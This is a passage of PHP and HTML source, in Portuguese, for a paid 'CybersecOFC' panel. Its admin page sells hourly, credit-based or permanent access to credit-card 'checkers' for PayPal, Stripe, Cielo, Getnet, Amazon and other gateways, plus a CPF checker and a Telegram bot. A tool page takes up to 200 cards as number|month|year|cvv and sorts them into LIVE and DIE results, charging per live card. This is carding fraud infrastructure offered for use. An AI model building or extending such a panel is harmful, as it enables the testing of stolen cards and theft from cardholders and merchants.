                <div class="feature-category">
                    <h3>🛡️ GATES ESPECIAIS</h3>
                    <ul>
                        <li>GRINGA - Checker internacional</li>
                        <li>ELO - Verificação ELO</li>
                        <li>EREDE - Sistema EREDE</li>
                        <li>ALLBINS - Verificação múltipla</li>
                        <li>STRIPE - Checker Stripe</li>
                        <li>VISA/MASTER - Verificação direta</li>
                        <li>AMAZON - Checkers Amazon</li>
                        <li>CPF CHECKER - Verificação de CPF</li>
                    </ul>
                </div>
            </div>
        </div>

        <?php if (isset($_GET['expired'])): ?>
            <div class="info">⏱️ ACCESS EXPIRED | CONTACT ADMINISTRATOR FOR RENEWAL</div>
        <?php endif; ?>

        <?php if (isset($login_error)): ?>
            <div class="error">⚠️ ACCESS DENIED: <?php echo strtoupper($login_error); ?></div>
        <?php endif; ?>

        <form method="POST">
            <div class="form-group">
                <div class="terminal-prompt">ENTER USERNAME</div>
                <input type="text" name="username" placeholder="username_" required autofocus autocomplete="off">
            </div>
            <div class="form-group">
                <div class="terminal-prompt">ENTER PASSWORD</div>
                <input type="password" name="password" placeholder="********" required autocomplete="off">
            </div>
            <button type="submit" name="login" class="btn-login">
                ► AUTHENTICATE
            </button>
        </form>

        <div class="access-denied">
            UNAUTHORIZED ACCESS WILL BE MONITORED AND REPORTED
        </div>
    </div>

    <script>
        const matrixBg = document.getElementById('matrixBg');
        const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&@*';

        for (let i = 0; i < 40; i++) {
            const column = document.createElement('div');
            column.className = 'matrix-column';
            column.style.left = Math.random() * 100 + '%';
            column.style.animationDuration = (Math.random() * 10 + 10) + 's';
            column.style.animationDelay = Math.random() * 10 + 's';
            column.style.opacity = Math.random() * 0.3 + 0.1;

            let text = '';
            for (let j = 0; j < 80; j++) {
                text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
            }
            column.innerHTML = text;
            matrixBg.appendChild(column);
        }
    </script>
</body>
</html>
<?php
exit;
}

// ============================================
// PAINEL ADMINISTRATIVO
// ============================================

if ($_SESSION['role'] === 'admin' && isset($_GET['admin'])) {
    $users = loadUsers();
    $bot_token = file_exists($bot_token_file) ? file_get_contents($bot_token_file) : '';
    $bot_enabled = file_exists($bot_enabled_file) ? trim(file_get_contents($bot_enabled_file)) === '1' : false;
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel Admin - CybersecOFC</title>
    <?php echo $music_embed; ?>
    <?php echo $security_script; ?>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap');

        :root {
            --neon-green: #00ff00;
            --neon-blue: #00ffff;
            --neon-purple: #ff00ff;
            --neon-yellow: #ffff00;
            --dark-bg: #0a0a0f;
            --darker-bg: #05050a;
            --card-bg: rgba(10, 20, 30, 0.9);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--dark-bg);
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(0, 255, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 40% 80%, rgba(255, 255, 0, 0.1) 0%, transparent 20%);
            color: var(--neon-green);
            font-family: 'Exo 2', sans-serif;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: var(--card-bg);
            border: 2px solid var(--neon-green);
            border-radius: 20px;
            box-shadow: 0 0 40px rgba(0, 255, 0, 0.2);
            backdrop-filter: blur(10px);
        }

        .header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 42px;
            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue), var(--neon-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
        }

        .header p {
            color: var(--neon-blue);
            font-size: 16px;
        }

        .nav-buttons {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 12px 30px;
            border: 2px solid;
            background: rgba(0, 0, 0, 0.8);
            cursor: pointer;
            font-family: 'Exo 2', sans-serif;
            font-size: 14px;
            border-radius: 10px;
            transition: all 0.3s;
            font-weight: 600;
            text-decoration: none;
            display: inline-block;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-primary {
            color: var(--neon-green);
            border-color: var(--neon-green);
        }

        .btn-primary:hover {
            background: var(--neon-green);
            color: #000;
            box-shadow: 0 0 20px var(--neon-green);
        }

        .btn-danger {
            color: #ff0000;
            border-color: #ff0000;
        }

        .btn-danger:hover {
            background: #ff0000;
            color: #000;
            box-shadow: 0 0 20px #ff0000;
        }

        .btn-warning {
            color: var(--neon-yellow);
            border-color: var(--neon-yellow);
        }

        .btn-warning:hover {
            background: var(--neon-yellow);
            color: #000;
            box-shadow: 0 0 20px var(--neon-yellow);
        }

        .btn-bot {
            color: var(--neon-purple);
            border-color: var(--neon-purple);
        }

        .btn-bot:hover {
            background: var(--neon-purple);
            color: #fff;
            box-shadow: 0 0 20px var(--neon-purple);
        }

        .admin-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }

        .admin-section {
            background: var(--card-bg);
            border: 2px solid var(--neon-green);
            border-radius: 15px;
            padding: 25px;
            backdrop-filter: blur(10px);
            transition: transform 0.3s;
        }

        .admin-section:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 255, 0, 0.2);
        }

        .admin-section h2 {
            color: var(--neon-blue);
            font-family: 'Orbitron', sans-serif;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid var(--neon-green);
            font-size: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            color: var(--neon-blue);
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 600;
        }

        .form-group input,
        .form-group select,
        .form-group textarea {
            width: 100%;
            padding: 12px 15px;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid var(--neon-green);
            color: var(--neon-green);
            font-family: 'Exo 2', sans-serif;
            border-radius: 10px;
            transition: all 0.3s;
        }

        .form-group input:focus,
        .form-group select:focus,
        .form-group textarea:focus {
            border-color: var(--neon-blue);
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
            outline: none;
        }

        .checker-options {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 10px;
        }

        .checker-option {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 12px;
            background: rgba(0, 255, 0, 0.1);
            border-radius: 8px;
            border: 1px solid var(--neon-green);
        }

        .checker-option input[type="checkbox"] {
            width: 18px;
            height: 18px;
            cursor: pointer;
            accent-color: var(--neon-green);
        }

        .checker-option label {
            color: var(--neon-green);
            cursor: pointer;
            margin: 0;
            font-size: 13px;
        }

        .users-list {
            margin-top: 20px;
        }

        .user-item {
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid var(--neon-green);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.3s;
        }

        .user-item:hover {
            background: rgba(0, 255, 0, 0.1);
            transform: translateX(5px);
        }

        .user-item.temporary {
            border-color: var(--neon-yellow);
            background: rgba(255, 255, 0, 0.05);
        }

        .user-item.credits {
            border-color: var(--neon-purple);
            background: rgba(255, 0, 255, 0.05);
        }

        .user-item.expired {
            border-color: #ff0000;
            background: rgba(255, 0, 0, 0.05);
            opacity: 0.7;
        }

        .user-info {
            flex: 1;
        }

        .user-info strong {
            color: var(--neon-green);
            font-size: 18px;
            display: block;
            margin-bottom: 5px;
        }

        .type-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
            margin-left: 10px;
            text-transform: uppercase;
        }

        .type-permanent {
            background: var(--neon-green);
            color: #000;
        }

        .type-temporary {
            background: var(--neon-yellow);
            color: #000;
        }

        .type-credits {
            background: var(--neon-purple);
            color: #fff;
        }

        .user-details {
            margin-top: 10px;
        }

        .user-details div {
            color: var(--neon-blue);
            font-size: 13px;
            margin: 3px 0;
        }

        .success {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid var(--neon-green);
            color: var(--neon-green);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 25px;
            text-align: center;
        }

        .error {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff0000;
            color: #ff0000;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 25px;
            text-align: center;
        }

        .bot-status {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            padding: 15px;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.3);
        }

        .bot-status.online {
            border: 2px solid var(--neon-green);
        }

        .bot-status.offline {
            border: 2px solid #ff0000;
        }

        .bot-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        .bot-indicator.online {
            background: var(--neon-green);
            box-shadow: 0 0 10px var(--neon-green);
        }

        .bot-indicator.offline {
            background: #ff0000;
        }

        .bot-controls {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        @media (max-width: 768px) {
            .admin-grid {
                grid-template-columns: 1fr;
            }

            .nav-buttons {
                flex-direction: column;
            }

            .btn {
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚙️ PAINEL ADMINISTRATIVO</h1>
            <p>Bem-vindo, <?php echo $_SESSION['username']; ?>!</p>
        </div>

        <div class="nav-buttons">
            <a href="index.php" class="btn btn-primary">← Voltar ao Menu</a>
            <a href="#bot-section" class="btn btn-bot">🤖 Configurar Bot</a>
            <a href="?logout" class="btn btn-danger">Sair</a>
        </div>

        <?php if (isset($success_message)): ?>
            <div class="success"><?php echo $success_message; ?></div>
        <?php endif; ?>

        <?php if (isset($error_message)): ?>
            <div class="error"><?php echo $error_message; ?></div>
        <?php endif; ?>

        <div class="admin-grid">
            <div class="admin-section">
                <h2>👤 Adicionar Usuário Permanente</h2>
                <form method="POST">
                    <div class="form-group">
                        <label>Nome de Usuário:</label>
                        <input type="text" name="new_username" required>
                    </div>
                    <div class="form-group">
                        <label>Senha:</label>
                        <input type="password" name="new_password" required>
                    </div>
                    <div class="form-group">
                        <label>Selecione os Checkers:</label>
                        <div class="checker-options">
                            <?php 
                            $all_checkers = ['paypal', 'preauth', 'n7', 'amazon1', 'amazon2', 'cpfchecker', 'ggsitau', 
                                           'getnet', 'auth', 'debitando', 'n7_new', 'gringa', 'elo', 'erede', 'allbins', 'stripe', 'visamaster'];
                            foreach ($all_checkers as $checker): 
                                $checker_names = [
                                    'paypal' => 'PayPal',
                                    'preauth' => 'cielo',
                                    'n7' => 'PAGARME',
                                    'amazon1' => 'Amazon Prime',
                                    'amazon2' => 'Amazon UK',
                                    'cpfchecker' => 'CPF Checker',
                                    'ggsitau' => 'GGs ITAU',
                                    'getnet' => 'GETNET',
                                    'auth' => 'AUTH',
                                    'debitando' => 'DEBITANDO',
                                    'n7_new' => 'N7',
                                    'gringa' => 'GRINGA',
                                    'elo' => 'ELO',
                                    'erede' => 'EREDE',
                                    'allbins' => 'ALLBINS',
                                    'stripe' => 'STRIPE',
                                    'visamaster' => 'VISA/MASTER'
                                ];
                            ?>
                            <div class="checker-option">
                                <input type="checkbox" name="checkers[]" value="<?php echo $checker; ?>" id="perm_<?php echo $checker; ?>">
                                <label for="perm_<?php echo $checker; ?>"><?php echo $checker_names[$checker] ?? $checker; ?></label>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    <button type="submit" name="add_permanent_user" class="btn btn-primary">Adicionar Usuário Permanente</button>
                </form>
            </div>

            <div class="admin-section">
                <h2>⏱️ Criar Acesso Temporário</h2>
                <form method="POST">
                    <div class="form-group">
                        <label>Nome de Usuário:</label>
                        <input type="text" name="rental_username" required>
                    </div>
                    <div class="form-group">
                        <label>Senha:</label>
                        <input type="password" name="rental_password" required>
                    </div>
                    <div class="form-group">
                        <label>Quantidade de Horas:</label>
                        <input type="number" name="rental_hours" min="1" max="720" placeholder="Ex: 1, 24, 168" required>
                    </div>
                    <div class="form-group">
                        <label>Selecione os Checkers:</label>
                        <div class="checker-options">
                            <?php foreach ($all_checkers as $checker): ?>
                            <div class="checker-option">
                                <input type="checkbox" name="rental_checkers[]" value="<?php echo $checker; ?>" id="rental_<?php echo $checker; ?>">
                                <label for="rental_<?php echo $checker; ?>"><?php echo $checker_names[$checker] ?? $checker; ?></label>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    <button type="submit" name="add_rental_user" class="btn btn-primary">Criar Acesso Temporário</button>
                </form>
            </div>

            <div class="admin-section">
                <h2>💰 Criar Usuário por Créditos</h2>
                <form method="POST">
                    <div class="form-group">
                        <label>Nome de Usuário:</label>
                        <input type="text" name="credit_username" required>
                    </div>
                    <div class="form-group">
                        <label>Senha:</label>
                        <input type="password" name="credit_password" required>
                    </div>
                    <div class="form-group">
                        <label>Quantidade de Créditos:</label>
                        <input type="number" name="credit_amount" min="0.05" step="0.01" placeholder="Ex: 10.00" required>
                        <small style="color: var(--neon-blue);">LIVE: 1.50 créditos | DIE: 0.05 créditos</small>
                    </div>
                    <div class="form-group">
                        <label>Selecione os Checkers:</label>
                        <div class="checker-options">
                            <?php foreach ($all_checkers as $checker): ?>
                            <div class="checker-option">
                                <input type="checkbox" name="credit_checkers[]" value="<?php echo $checker; ?>" id="credit_<?php echo $checker; ?>">
                                <label for="credit_<?php echo $checker; ?>"><?php echo $checker_names[$checker] ?? $checker; ?></label>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    <button type="submit" name="add_credit_user" class="btn btn-warning">Criar Usuário por Créditos</button>
                </form>
            </div>

            <div class="admin-section" id="bot-section">
                <h2>🤖 Configuração do Bot Telegram</h2>

                <div class="bot-status <?php echo $bot_enabled ? 'online' : 'offline'; ?>">
                    <div class="bot-indicator <?php echo $bot_enabled ? 'online' : 'offline'; ?>"></div>
                    <span><?php echo $bot_enabled ? 'BOT ONLINE' : 'BOT OFFLINE'; ?></span>
                </div>

                <form method="POST">
                    <div class="form-group">
                        <label>Token do Bot:</label>
                        <input type="text" name="bot_token" value="<?php echo htmlspecialchars($bot_token); ?>" placeholder="Digite o token do bot">
                    </div>

                    <div class="bot-controls">
                        <button type="submit" name="save_bot_token" class="btn btn-bot">💾 Salvar Token</button>
                        <button type="submit" name="start_bot" class="btn btn-primary" <?php echo empty($bot_token) ? 'disabled' : ''; ?>>▶ Iniciar Bot</button>
                        <button type="submit" name="stop_bot" class="btn btn-danger">⏹ Parar Bot</button>
                    </div>
                </form>

                <div class="form-group" style="margin-top: 20px;">
                    <label>Mensagem de Broadcast:</label>
                    <textarea name="broadcast_message" rows="3" placeholder="Digite a mensagem para enviar a todos os grupos"></textarea>
                    <button type="submit" name="send_broadcast" class="btn btn-warning" style="margin-top: 10px;">📢 Enviar para Todos</button>
                </div>
            </div>

            <div class="admin-section">
                <h2>🔋 Recarregar Créditos</h2>
                <form method="POST">
                    <div class="form-group">
                        <label>Nome de Usuário:</label>
                        <input type="text" name="recharge_username" placeholder="Digite o nome do usuário" required>
                    </div>
                    <div class="form-group">
                        <label>Créditos para Adicionar:</label>
                        <input type="number" name="add_credits" min="0.05" step="0.01" placeholder="Quantidade de créditos" required>
                    </div>
                    <button type="submit" name="add_credits" class="btn btn-warning">Recarregar Créditos</button>
                </form>
            </div>

            <div class="admin-section">
                <h2>📋 Usuários Cadastrados</h2>
                <div class="users-list">
                    <?php 
                    foreach ($users as $username => $data): 
                        $isExpired = false;
                        $expiresText = '';
                        $creditsText = '';

                        if ($data['type'] === 'temporary') {
                            $isExpired = time() > $data['expires_at'];
                            $expiresAt = date('d/m/Y H:i:s', $data['expires_at']);
                            $timeLeft = $data['expires_at'] - time();

                            if ($isExpired) {
                                $expiresText = "❌ EXPIRADO em $expiresAt";
                            } else {
                                $hoursLeft = floor($timeLeft / 3600);
                                $minutesLeft = floor(($timeLeft % 3600) / 60);
                                $expiresText = "⏳ Expira em: $expiresAt ($hoursLeft h $minutesLeft min restantes)";
                            }
                        } elseif ($data['type'] === 'credits') {
                            $credits = $data['credits'];
                            $creditsText = "💳 Créditos: " . number_format($credits, 2) . " (LIVE: 1.50 | DIE: 0.05)";
                        }

                        $itemClass = 'user-item';
                        if ($data['type'] === 'temporary') {
                            $itemClass .= $isExpired ? ' expired' : ' temporary';
                        } elseif ($data['type'] === 'credits') {
                            $itemClass .= ' credits';
                        }

                        $toolsList = implode(', ', array_map(function($tool) use ($checker_names) {
                            return $checker_names[$tool] ?? $tool;
                        }, $data['tools'] ?? ['paypal']));
                    ?>
                        <div class="<?php echo $itemClass; ?>">
                            <div class="user-info">
                                <strong><?php echo $username; ?></strong>
                                <span class="type-badge type-<?php echo $data['type']; ?>">
                                    <?php 
                                    echo $data['type'] === 'permanent' ? 'PERMANENTE' : 
                                         ($data['type'] === 'temporary' ? 'TEMPORÁRIO' : 'CRÉDITOS');
                                    ?>
                                </span>
                                <div class="user-details">
                                    <div>👤 <?php echo $data['role'] === 'admin' ? 'Administrador' : 'Usuário'; ?></div>
                                    <?php if ($creditsText): ?>
                                        <div><?php echo $creditsText; ?></div>
                                    <?php endif; ?>
                                    <div>🔧 Ferramentas: <?php echo $toolsList; ?></div>
                                    <?php if ($data['type'] === 'temporary'): ?>
                                        <div><?php echo $expiresText; ?></div>
                                    <?php endif; ?>
                                </div>
                            </div>
                            <?php if ($username !== 'save'): ?>
                                <form method="POST" style="display: inline;">
                                    <input type="hidden" name="remove_username" value="<?php echo $username; ?>">
                                    <button type="submit" name="remove_user" class="btn btn-danger" onclick="return confirm('Deseja remover este usuário?')">🗑 Remover</button>
                                </form>
                            <?php endif; ?>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
<?php
exit;
}

// ============================================
// FERRAMENTA ESPECÍFICA
// ============================================

if (isset($_GET['tool'])) {
    $selectedTool = $_GET['tool'];

    // Verificar permissão
    if (!in_array($selectedTool, $_SESSION['tools'])) {
        header('Location: index.php');
        exit;
    }

    // Carregar dados atualizados do usuário
    $users = loadUsers();
    $userData = $users[$_SESSION['username']] ?? [];
    $userCredits = $userData['credits'] ?? 0;
    $userType = $userData['type'] ?? 'permanent';

    $toolNames = [
        'paypal' => 'PayPal V2',
        'preauth' => 'cielo',
        'n7' => 'PAGARME',
        'amazon1' => 'Amazon Prime Checker',
        'amazon2' => 'Amazon UK Checker',
        'cpfchecker' => 'CPF Checker',
        'ggsitau' => 'GGs ITAU',
        'getnet' => 'GETNET',
        'auth' => 'AUTH',
        'debitando' => 'DEBITANDO',
        'n7_new' => 'N7',
        'gringa' => 'GRINGA',
        'elo' => 'ELO',
        'erede' => 'EREDE',
        'allbins' => 'ALLBINS',
        'stripe' => 'STRIPE',
        'visamaster' => 'VISA/MASTER'
    ];

    $toolName = $toolNames[$selectedTool] ?? 'Ferramenta';
    $isChecker = true; // Todas são checkers agora
    $isAmazonChecker = in_array($selectedTool, ['amazon1', 'amazon2']);

    // Configurações específicas por tipo de ferramenta
    $inputLabel = "💳 Cole os cartões abaixo (um por linha) - MÁXIMO 200 CARTÕES";
    $inputFormat = "Formato: numero|mes|ano|cvv";
    $inputExample = "4532015112830366|12|2027|123\n5425233430109903|01|2028|456\n4716989580001234|03|2029|789";
    $placeholder = "Cole seus cartões aqui no formato:\nnumero|mes|ano|cvv\n\nMÁXIMO: 200 cartões por vez";
    $howToUse = [
        "1. Cole os cartões no formato: <strong>numero|mes|ano|cvv</strong>",
        "2. Um cartão por linha (máximo 200 cartões por verificação)",
        "3. Clique em <strong>Iniciar</strong> para começar a verificação",
        "4. Os resultados aparecerão em tempo real exatamente como a API retorna"
    ];

    $timeLeftText = '';
    $creditsText = '';

    if ($userType === 'temporary') {
        $timeLeft = $userData['expires_at'] - time();
        $hoursLeft = floor($timeLeft / 3600);
        $minutesLeft = floor(($timeLeft % 3600) / 60);
        $timeLeftText = "⏱️ Tempo restante: {$hoursLeft}h {$minutesLeft}min";
    } elseif ($userType === 'credits') {
        $creditsText = "💳 Créditos disponíveis: " . number_format($userCredits, 2) . " (LIVE: 1.50 | DIE: 0.05)";
    }
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $toolName; ?> - CybersecOFC</title>
    <?php echo $music_embed; ?>
    <?php echo $security_script; ?>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap');

        :root {
            --neon-green: #00ff00;
            --neon-blue: #00ffff;
            --neon-purple: #ff00ff;
            --neon-yellow: #ffff00;
            --dark-bg: #0a0a0f;
            --darker-bg: #05050a;
            --card-bg: rgba(10, 20, 30, 0.9);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--dark-bg);
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(0, 255, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 40% 80%, rgba(255, 255, 0, 0.1) 0%, transparent 20%);
            color: var(--neon-green);
            font-family: 'Exo 2', sans-serif;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: var(--card-bg);
            border: 2px solid var(--neon-green);
            border-radius: 20px;
            box-shadow: 0 0 40px rgba(0, 255, 0, 0.2);
            backdrop-filter: blur(10px);
            position: relative;
        }

        .header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 36px;
            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
        }

        .header p {
            color: var(--neon-blue);
            font-size: 16px;
        }

        .user-info {
            position: absolute;
            top: 20px;
            right: 20px;
            color: var(--neon-blue);
            font-size: 14px;
            text-align: right;
        }

        .info-box {
            background: var(--card-bg);
            border: 2px solid var(--neon-green);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            backdrop-filter: blur(10px);
        }

        .info-box h3 {
            color: var(--neon-blue);
            font-family: 'Orbitron', sans-serif;
            font-size: 18px;
            margin-bottom: 15px;
            border-bottom: 2px solid var(--neon-green);
            padding-bottom: 10px;
        }

        .info-box ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .info-box ul li {
            color: var(--neon-green);
            font-size: 14px;
            padding: 8px 0;
            padding-left: 25px;
            position: relative;
            line-height: 1.6;
        }

        .info-box ul li::before {
            content: '▶';
            position: absolute;
            left: 0;
            color: var(--neon-blue);
        }

        .time-left, .credits-info {
            color: var(--neon-yellow);
            font-size: 16px;
            margin: 20px 0;
            text-align: center;
            padding: 15px;
            background: rgba(255, 255, 0, 0.1);
            border: 2px solid var(--neon-yellow);
            border-radius: 10px;
            backdrop-filter: blur(5px);
        }

        .credits-info {
            color: var(--neon-purple);
            border-color: var(--neon-purple);
            background: rgba(255, 0, 255, 0.1);
        }

        .nav-buttons {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 12px 30px;
            border: 2px solid;
            background: rgba(0, 0, 0, 0.8);
            cursor: pointer;
            font-family: 'Exo 2', sans-serif;
            font-size: 14px;
            border-radius: 10px;
            transition: all 0.3s;
            font-weight: 600;
            text-decoration: none;
            display: inline-block;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-primary {
            color: var(--neon-green);
            border-color: var(--neon-green);
        }

        .btn-primary:hover {
            background: var(--neon-green);
            color: #000;
            box-shadow: 0 0 20px var(--neon-green);
        }

        .btn-start {
            color: var(--neon-green);
            border-color: var(--neon-green);
        }

        .btn-start:hover {
            background: var(--neon-green);
            color: #000;
            box-shadow: 0 0 20px var(--neon-green);
        }

        .btn-stop {
            color: #ff0000;
            border-color: #ff0000;
        }

        .btn-stop:hover {
            background: #ff0000;
            color: #000;
            box-shadow: 0 0 20px #ff0000;
        }

        .btn-clear {
            color: var(--neon-yellow);
            border-color: var(--neon-yellow);
        }

        .btn-clear:hover {
            background: var(--neon-yellow);
            color: #000;
            box-shadow: 0 0 20px var(--neon-yellow);
        }

        .input-section {
            margin-bottom: 30px;
        }

        .input-section h3 {
            color: var(--neon-green);
            font-size: 18px;
            margin-bottom: 15px;
            font-family: 'Orbitron', sans-serif;
        }

        .input-section textarea {
            width: 100%;
            height: 200px;
            background: rgba(0, 0, 0, 0.8);
            color: var(--neon-green);
            border: 2px solid var(--neon-green);
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            resize: vertical;
            border-radius: 15px;
            transition: all 0.3s;
        }

        .input-section textarea:focus {
            border-color: var(--neon-blue);
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
            outline: none;
        }

        .input-section textarea::placeholder {
            color: rgba(0, 255, 0, 0.5);
        }

        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
            flex-wrap: wrap;
            align-items: center;
        }

        .loading {
            display: none;
            color: var(--neon-yellow);
            font-size: 14px;
            margin-left: 20px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.3; }
        }

        .loading.active {
            display: block;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 25px;
            background: var(--card-bg);
            border: 2px solid var(--neon-green);
            border-radius: 15px;
            backdrop-filter: blur(10px);
            margin-bottom: 30px;
        }

        .stat-item {
            text-align: center;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            border: 1px solid var(--neon-blue);
        }

        .stat-label {
            color: var(--neon-blue);
            font-size: 14px;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .stat-value {
            color: var(--neon-green);
            font-size: 32px;
            font-weight: bold;
            font-family: 'Orbitron', sans-serif;
            text-shadow: 0 0 10px var(--neon-green);
        }

        .results-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 50px;
        }

        @media (max-width: 1024px) {
            .results-container {
                grid-template-columns: 1fr;
            }
        }

        .result-box {
            border: 2px solid;
            padding: 25px;
            border-radius: 15px;
            min-height: 500px;
            max-height: 600px;
            overflow-y: auto;
            backdrop-filter: blur(10px);
        }

        .result-box h3 {
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid;
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            text-transform: uppercase;
        }

        .live-box {
            border-color: var(--neon-green);
            background: rgba(0, 255, 0, 0.05);
        }

        .live-box h3 {
            color: var(--neon-green);
            border-color: var(--neon-green);
        }

        .die-box {
            border-color: #ff0000;
            background: rgba(255, 0, 0, 0.05);
        }

        .die-box h3 {
            color: #ff0000;
            border-color: #ff0000;
        }

        .result-item {
            margin-bottom: 15px;
            padding: 15px;
            border-radius: 10px;
            font-size: 13px;
            animation: fadeIn 0.3s;
            font-family: 'Courier New', monospace;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .result-item.live {
            background: rgba(0, 255, 0, 0.1);
            color: var(--neon-green);
            border-left: 4px solid var(--neon-green);
        }

        .result-item.die {
            background: rgba(255, 0, 0, 0.1);
            color: #ff0000;
            border-left: 4px solid #ff0000;
        }

        ::-webkit-scrollbar {
            width: 10px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            background: var(--neon-green);
            border-radius: 10px;
        }

        .credits-counter {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--card-bg);
            color: var(--neon-purple);
            padding: 15px 25px;
            border-radius: 15px;
            font-weight: bold;
            z-index: 1000;
            border: 2px solid var(--neon-purple);
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.3);
        }

        .remaining-items {
            color: var(--neon-blue);
            font-size: 14px;
            margin-top: 15px;
            text-align: center;
            padding: 12px;
            background: rgba(0, 255, 255, 0.1);
            border: 2px solid var(--neon-blue);
            border-radius: 10px;
            display: none;
            backdrop-filter: blur(5px);
        }

        .remaining-items.active {
            display: block;
        }

        .example-section {
            background: rgba(255, 255, 0, 0.05);
            border: 2px solid var(--neon-yellow);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            backdrop-filter: blur(5px);
        }

        .example-section h3 {
            color: var(--neon-yellow);
            font-size: 18px;
            margin-bottom: 15px;
            font-family: 'Orbitron', sans-serif;
        }

        .example-box {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--neon-yellow);
            border-radius: 10px;
            padding: 20px;
        }

        .example-box pre {
            color: var(--neon-green);
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 0;
            line-height: 1.8;
            white-space: pre-wrap;
        }

        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }

            .header h1 {
                font-size: 24px;
            }

            .controls {
                flex-direction: column;
            }

            .btn {
                width: 100%;
                text-align: center;
            }

            .stats {
                grid-template-columns: 1fr 1fr;
            }

            .credits-counter {
                position: static;
